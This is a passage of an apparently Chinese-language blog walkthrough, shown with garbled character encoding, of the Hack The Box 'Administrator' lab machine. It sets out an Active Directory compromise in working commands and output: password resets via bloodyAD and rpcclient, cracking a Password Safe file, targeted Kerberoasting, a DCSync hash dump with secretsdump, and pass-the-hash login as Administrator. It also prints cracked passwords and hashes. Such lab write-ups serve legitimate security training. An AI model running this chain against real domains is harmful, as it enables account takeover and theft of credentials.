src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168679332-60dc56c5-0297-44d4-aee9-a571c6f0bdf8.png"></p><p>ftpç™»å½•benjamin</p><p>åœ¨<code>bloodhound</code>ä¸­æŸ¥çœ‹<code>benjamin</code>æ²¡æœ‰ä»»ä½•æƒé™ï¼Œä½†æ˜¯ä»–æ˜¯<code>share Moderator</code>ç»„çš„æˆå‘˜ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹<code>ftp</code>è¿æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168926833-e9c62747-0bf6-411e-8eba-19656aadb99e.png"></p><p>æ¥ä¸‹æ¥ä½¿ç”¨ftpç™»å½•<code>michael</code>è´¦æˆ·ï¼Œ</p><p>ftp</p><p>rpcclient</p><p><a href="https://www.secrss.com/articles/48320">https://www.secrss.com/articles/48320</a></p><p>å…ˆä¿®æ”¹å¯†ç </p><h5 id="benjamin-emily"><a href="#benjamin-emily" class="headerlink" title="benjamin-&gt;emily"></a>benjamin-&gt;emily</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -u &quot;michael&quot; -p &quot;michael&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;benjamin&quot; &quot;12345678&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/HTB/Administrator]</span><br><span class="line">â””â”€# rpcclient -U michael 10.10.11.42</span><br><span class="line">Password for [WORKGROUP\michael]:</span><br><span class="line">rpcclient $&gt; setuserinfo2 benjamin 23 &#x27;benjamin&#x27;</span><br><span class="line">rpcclient $&gt; exit</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">â””â”€# ftp benjamin@10.10.11.42</span><br><span class="line">Connected to 10.10.11.42.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">331 Password required</span><br><span class="line">Password: </span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br></pre></td></tr></table></figure><p>ftpç™»å½•ä¹‹åï¼ŒæŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶<code>Backup.psafe3</code>ï¼Œå°†å®ƒä¸‹è½½ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; dir</span><br><span class="line">ftp&gt; binary  #åˆ‡æ¢æˆäºŒè¿›åˆ¶æ¨¡å¼ä¼ è¾“æ–‡ä»¶</span><br><span class="line">200 Type set to I.</span><br><span class="line">ftp&gt; get Backup.psafe3</span><br><span class="line">local: Backup.psafe3 remote: Backup.psafe3</span><br><span class="line">229 Entering Extended Passive Mode (|||51246|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |**********************************************************************************************|   952        0.77 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">952 bytes received in 00:01 (0.77 KiB/s)</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734169943968-96a14c7b-6c34-4c33-a401-cb42f0b3d7a7.png"></p><p>åœ¨å“ªæ‰“å¼€ç»ˆç«¯å°±ä¼šä¸‹åˆ°å“ªä¸ªç›®å½•ä¸‹</p><p>psafe3 æ–‡ä»¶æ˜¯åŠ å¯†çš„å¯†ç å®‰å…¨æ–‡ä»¶</p><p>æ— æ³•ç›´æ¥è¯»å–ï¼Œéœ€è¦ä½¿ç”¨ <code>pwsafe2john</code> å·¥å…·è¿›è¡Œè·å– hashï¼Œå¡ kali è‡ªå¸¦æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]</span><br><span class="line">â””â”€# pwsafe2john Backup.psafe3  </span><br><span class="line">Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° hashï¼Œå°è¯•è¿›è¡Œè§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]</span><br><span class="line">â””â”€# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])</span><br><span class="line">Cost 1 (iteration count) is 2048 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">tekieromucho     (Backu)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734170433273-6bbaf1e7-77d7-4785-a511-a82311921ab8.png"></p><p>ç”¨æœ¬æœºçš„è½¯ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171146786-b9d44411-5cc5-4587-98d9-6f49a1cbb63a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</span><br><span class="line">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span><br><span class="line">emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>emily</code>çš„å¯†ç ä¸ºï¼š<code>UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p><p>ä½¿ç”¨<code>evil-winrm</code>ç™»å½•<code>emily</code>ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/HTB/Administrator]</span><br><span class="line">â””â”€# evil-winrm -i 10.10.11.42 -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; whoami</span><br><span class="line">administrator\emily</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿ä¸‹emilyæƒé™ï¼Œè¿›å…¥æ¡Œé¢ç›®å½•ï¼Œæ‹¿ä¸‹ç¬¬ä¸€ä¸ªflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; cd ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\emily\Desktop</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk</span><br><span class="line">-ar---         12/7/2024  12:20 AM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; cat user.txt</span><br><span class="line">888ac3b3d60b08fa502ca90c9e90d506</span><br></pre></td></tr></table></figure><h5 id="emily-ethan"><a href="#emily-ethan" class="headerlink" title="emily-&gt;ethan"></a>emily-&gt;ethan</h5><p>å†æ¬¡æŸ¥çœ‹<code>bloodhound</code>ï¼Œ<code>emily</code>æœ‰ä¸€ä¸ªFDOCï¼Œå¯¹ç”¨æˆ·<code>ethan</code>æ‹¥æœ‰<code>GenericWrite</code>æƒé™ã€‚</p><p>åœ¨ Active Directory (AD) ç¯å¢ƒä¸­ï¼ŒGenericWrite æ˜¯ä¸€ç§æƒé™ï¼Œå…è®¸æ”»å‡»è€…å¯¹ç›®æ ‡è´¦æˆ·çš„å±æ€§è¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171554355-7f2a77cf-4151-42f7-a7c7-bd92bbde3ba5.png"></p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹<code>Kerberoastingæ”»å‡»</code></p><p>Kerberos åè®®åœ¨å¤„ç†èº«ä»½éªŒè¯æ—¶ï¼Œå…è®¸åŸŸå†…ç”¨æˆ·ä¸ºæ‹¥æœ‰ <code>SPN</code>(Service Principal Nameï¼Œæ ‡è¯†æœåŠ¡å®ä¾‹çš„å”¯ä¸€åç§°) çš„è´¦æˆ·è¯·æ±‚æœåŠ¡ç¥¨æ®ã€‚</p><p>è¿™äº›ç¥¨æ®é€šå¸¸æ˜¯ç”±è´¦æˆ·çš„ NTLM å“ˆå¸ŒåŠ å¯†ç”Ÿæˆçš„ï¼Œåªè¦åŸŸè´¦æˆ·æ³¨å†Œäº†<code>SPN</code>ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨<code>Kerberos</code>è¯·æ±‚æœåŠ¡ç¥¨æ®å¹¶æå–ç¥¨æ®ã€‚å› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡ç¦»çº¿ç ´è§£æœåŠ¡ç¥¨æ®(ä¾‹å¦‚ä½¿ç”¨å·¥å…· <code>PowerView</code> æˆ– <code>GetUserSPNs.py</code>)é—´æ¥å¾—åˆ°ç›®æ ‡è´¦æˆ·çš„å¯†ç ã€‚</p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬æ²¡æœ‰çœ‹åˆ°<code>ethan</code>ç”¨æˆ·æ³¨å†Œ<code>SPN</code>ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½é€šè¿‡<code>GenericWrite</code>ä¸º<code>ethan</code>ç”¨æˆ·åˆ›å»ºä¸€ä¸ª<code>SPN</code>ï¼Œç„¶åè¯·æ±‚ä¸€ä¸ªç¥¨æ®å¹¶ä½¿ç”¨<code>targetedKerberoast.py</code>ç ´è§£å®ƒã€‚</p><p>targetedKerberoast.pyä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p><p>å…ˆæ›´æ–°ä¸€ä¸‹æ—¶é—´ï¼Œä¸ç„¶ä¼šæœ‰æ—¶å·®ï¼Œå¯¼è‡´ç ´è§£å¤±è´¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€# ntpdig 10.10.11.42</span><br><span class="line">2024-12-15 02:22:47.084508 (+0800) +25206.101334 +/- 0.209603 10.10.11.42 s1 no-leap</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€# ntpdate 10.10.11.42</span><br><span class="line">2024-12-15 02:23:04.429985 (+0800) +25206.072243 +/- 0.240176 10.10.11.42 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25206.072243</span><br></pre></td></tr></table></figure><p>åˆ›å»ºSPN</p><p>Set-ADUser -Identity ethan -ServicePrincipalNames @{ADD&#x3D;â€opsSPN&#x2F;hostâ€}</p><p>ç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/targetedKerberoast-main]</span><br><span class="line">â””â”€# python targetedKerberoast.py -u &quot;emily&quot; -p &quot;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&quot; -d &quot;Administrator.htb&quot; --dc-ip 10.10.11.42</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[+] Printing hash for (ethan)</span><br><span class="line">$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$c272d2d4f6c0ecab1c52f9c3a61a7752$80ac44b67f02b88210f31a575ec0c3e8ef7a74fa05eea49a2afe46ae6a8085a0c8fc51ab9f1d0ae4849aae9dd2880b46a2cf1f7a1c9b2ba5639cb58c0f7e4e2b5474cda1e70fae234f89807cc8d2b7972079899077da12b0a662439fd592504c4d942759de88d5b8f93ee57f3306444ceba8b69c934d9ad5de4d98fe198b63fcda638a2b2dde3b246b7e34974e600c843c44ed41034ada89298d3081ba78d23aca4adad45aa123840df2de7ddab67f0138ca0c96dc712a927e5dbc2123709f7c5873f025912727e2212671ad3f5f37a10e6fd65cf93ac77d514acd615f105f977eb6afb1ab3917415f0a86f21137569fa23131d295be7478e34c29048fadf4875a2029e89d7c10f743e589521982eb9928beb8df8b1273c44eac940910aea9fbb046900897eac2476d33874ce71713016a7f879fcdedcdacdcc1d079fceb0235d909e77416760aa14918853bca87d9801ea1364bb8bfa9b9ff8bdfaae3a227d214832c8c8c787ea304e0aaa43828428b5f976569b8aa809adbdecc775f2edb41b2276b895ccc189675eae246123f5e903bb6cf5c35f641a244698a405999faae73096ad9bbee2e9d5427e2ac169350d5172578482327a326708d019348520750a144a90f7684aa4a2557ede1bb4ba25a6a2ed9bfc24acee897e8cd52db8e10232518e8201dc5b39317ea892ae6b4db81a1e75c70bf99b8b3d8b83a35bd664a8e387e1ae092844dc62420c418b9b3790071908d9131b79e242bfd33489318278460ed861ce63b3c51a3cf7f4b6122083db3e30dcd9a4e088ddda78d9bf337d0e1ede8192e0aa6ddc436a658f8ab92c4a7c4684352dd873159cbb830d703f46b7f2f86d63f5f512867a3298df24f7ffa7276865fc5e8affa0944b44e7691482e66934b8f32cbe4b6033a1145164b2c12dbc1f6ccec70076b61dc21f40f7f9b22f3daf6cacab4073dd5365f617255df7fb89b948e41c12fdd251508ed2c537a268595a10f012b5ca1b783dbdc238b375b215404dee90122627e1cbd8982fcc34fef8f0c0073f4391aff527e5be543ce4678bdc22b8bd1a7373b017680060552ea8a2f703a9fdfaf4f81370f9b5d3c21d2f50e3975c2246965047642679258a429adcf05ec61dfb6852148b53cdb741e752d0d716625956c4504e99a915bdb27cba9970e6ae8f5af1249fef2a3c8c935daae78e1413378894c4f18429b7cee5fdb3e9dabd30155253e0efe850f47baea504f3b74247617d62de7a482ad245b1d5d43fdbf2ddabc18e7da4a381cdf51f9d2d6d2c953bbfd73e57af2e59dcec4194cf03cf8ca8e8098319c2941069d0b11fab87292e0ef94aad811b662c541d25dcb629b1466d4133cfec0e5f9c21180cc74e80170707fd45cff021430187b4cfcdc5120f568567ad80f8a705446cb355ed2d49af31fe8825e65e5dcdc659fd78d4856f89a8ea2179fd30b9c802d3a16b378c6ab39c738de3d454b2649f2e6a33f7fdec9c866ca59f3fc50924aa5a21e7a4a4852cd159aca2c03d0f100b355a21ee9</span><br></pre></td></tr></table></figure><p>è§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Administrator]</span><br><span class="line">â””â”€# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">limpbizkit       (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734175893236-95d7ed55-3eee-4c84-a028-55cec189d4c9.png">å¾—åˆ° Ethan çš„å¯†ç ï¼š<code>limpbizkit</code></p><h5 id="Ethan-Administrator"><a href="#Ethan-Administrator" class="headerlink" title="Ethan-&gt;Administrator"></a>Ethan-&gt;Administrator</h5><p>ç°åœ¨æˆ‘ä»¬å·²ç»è·å–äº†<code>ethan</code> çš„å¯†ç ï¼Œä½¿ç”¨ BloodHound æ£€æŸ¥ä»–çš„æƒé™ã€‚å‘ç°<code>ethan</code> çš„ FDOCæƒé™é—´æ¥èµ‹äºˆäº†ä»–åœ¨åŸŸæ§åˆ¶å™¨ (Domain Controller, DC) ä¸Šçš„<code>DCSync</code>æƒé™ã€‚</p><p>DCSync æ˜¯ä¸€ç§æ»¥ç”¨ Active Directory (AD) å¤åˆ¶æœºåˆ¶çš„æ”»å‡»æŠ€æœ¯ã€‚æ‹¥æœ‰ DCSync æƒé™çš„ç”¨æˆ·å¯ä»¥æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼Œå‘å…¶ä»– DC è¯·æ±‚å¤åˆ¶æ•æ„Ÿæ•°æ®ï¼Œå¦‚ NTLM å“ˆå¸Œå’Œ Kerberos å¯†é’¥ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734176432890-2d7999a1-2f33-4d75-a09f-e22efaf18d64.png"></p><p>å€ŸåŠ©<code>DCSync</code>ï¼Œä½¿ç”¨<code>impacket-secretsdump</code>è½¬å‚¨åŸŸæ§åˆ¶å™¨ä¸Šçš„æ‰€æœ‰å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">â””â”€# impacket-secretsdump ethan:limpbizkit@10.10.11.42</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</span><br><span class="line">administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</span><br><span class="line">administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:e55bcd70f1b548fc4304ebd8a3f2f2f7:::</span><br><span class="line">administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</span><br><span class="line">administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</span><br><span class="line">administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</span><br><span class="line">administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</span><br><span class="line">administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2</span><br><span class="line">Administrator:des-cbc-md5:403286f7cdf18385</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94</span><br><span class="line">krbtgt:des-cbc-md5:2c0bc7d0250dbfc7</span><br><span class="line">administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3</span><br><span class="line">administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48</span><br><span class="line">administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9</span><br><span class="line">administrator.htb\michael:aes256-cts-hmac-sha1-96:dec0f5eac8b174633aa1449c41abdd0170098d31f2c38242675c6ad80873a229</span><br><span class="line">administrator.htb\michael:aes128-cts-hmac-sha1-96:4d614f91ce0d82e332d76139b19ec03b</span><br><span class="line">administrator.htb\michael:des-cbc-md5:49f10d5d97f19d5d</span><br><span class="line">administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e110f75337181474608f51a5b22d8198d3fa56d68633b384b7136d4496c89337</span><br><span class="line">administrator.htb\benjamin:aes128-cts-hmac-sha1-96:aa2b24ac2fb879262faa4f6ca294f332</span><br><span class="line">administrator.htb\benjamin:des-cbc-md5:1a4f0bce2343cebf</span><br><span class="line">administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4</span><br><span class="line">administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218</span><br><span class="line">administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51</span><br><span class="line">administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f</span><br><span class="line">administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f</span><br><span class="line">administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb</span><br><span class="line">administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6</span><br><span class="line">administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade</span><br><span class="line">administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf</span><br><span class="line">administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82</span><br><span class="line">administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e</span><br><span class="line">administrator.htb\emma:des-cbc-md5:3249fba89813ef5d</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d</span><br><span class="line">DC$:des-cbc-md5:f483547c4325492a</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>ç°åœ¨å·²ç»æ‹¥æœ‰äº†<code>Administrator</code>çš„å“ˆå¸Œå€¼ï¼Œä½¿ç”¨<code>evil-winrm</code>ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/secretsdump.py-main]</span><br><span class="line">â””â”€# evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br><span class="line">administrator\administrator</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»å½•<code>administrator</code>ç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°æ¡Œé¢ç›®å½•ï¼Œå‘ç°root.txtï¼Œæ‹¿ä¸‹ç¬¬äºŒä¸ªflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---        12/13/2024  11:45 PM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt</span><br><span class="line">c453aa7121957348d4d4f383383f48fe</span><br></pre></td></tr></table></figure><h3 id="æ¢å¤æ—¶é—´"><a href="#æ¢å¤æ—¶é—´" class="headerlink" title="æ¢å¤æ—¶é—´"></a>æ¢å¤æ—¶é—´</h3><p><a 